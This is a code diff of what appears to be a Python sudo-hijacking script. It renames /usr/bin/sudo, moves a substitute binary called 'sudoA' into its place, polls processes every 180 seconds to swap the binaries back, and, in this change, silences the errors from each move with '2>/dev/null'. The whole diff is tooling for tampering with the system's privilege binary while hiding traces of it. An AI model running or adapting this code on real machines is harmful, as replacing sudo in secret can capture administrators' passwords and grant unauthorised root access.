@@ -45,25 +45,24 @@ def main():
     if(len(sys.argv) > 1):
         if(sys.argv[1] == '1'):
             time.sleep(2)
-            os.system("mv /usr/bin/sudo /usr/bin/sudoC")
-            os.system("mv /usr/bin/sudoA /usr/bin/sudo")
+            os.system("mv /usr/bin/sudo /usr/bin/sudoC 2>/dev/null")
+            os.system("mv /usr/bin/sudoA /usr/bin/sudo 2>/dev/null")
         else:
-            while(True):
-                if(os.path.exists("/usr/bin/sudoC")):
-                    if(checkStatus("sudoC")):
-                        pass
-                    else:
-                        os.system("mv /usr/bin/sudo /usr/bin/sudoA")
-                        os.system("mv /usr/bin/sudoC /usr/bin/sudo")
-                time.sleep(180)
+            if(os.path.exists("/usr/bin/sudoC")):
+                if(checkStatus("sudoC")):
+                    pass
+                else:
+                    os.system("mv /usr/bin/sudo /usr/bin/sudoA 2>/dev/null")
+                    os.system("mv /usr/bin/sudoC /usr/bin/sudo 2>/dev/null")
+            time.sleep(180)
     else:
         while(True):
             if(os.path.exists("/usr/bin/sudoC")):
                 if(checkStatus("sudoC")):
                     pass
                 else:
-                    os.system("mv /usr/bin/sudo /usr/bin/sudoA")
-                    os.system("mv /usr/bin/sudoC /usr/bin/sudo")
+                    os.system("mv /usr/bin/sudo /usr/bin/sudoA 2>/dev/null")
+                    os.system("mv /usr/bin/sudoC /usr/bin/sudo 2>/dev/null")
             time.sleep(180)
 def checkStatus(fileName):
     ps_output = subprocess.check_output(["ps", "-ef"])
